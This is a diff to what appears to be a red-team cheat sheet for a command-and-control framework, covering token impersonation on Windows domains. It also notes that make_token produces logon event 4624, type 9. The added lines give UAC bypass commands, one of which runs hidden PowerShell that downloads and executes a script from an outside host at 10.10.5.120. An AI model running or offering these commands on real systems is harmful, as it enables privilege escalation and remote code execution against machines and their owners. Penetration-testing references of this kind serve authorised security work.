@@ -65,6 +65,10 @@ ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
 rev2self # Stop using token generated with make_token
 ## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
 
+# UAC Bypass
+elevate svc-exe &#x3C;listener>
+elevate uac-token-duplication &#x3C;listener>
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Steal token from pid
 ## Like make_token but stealing the token from a process
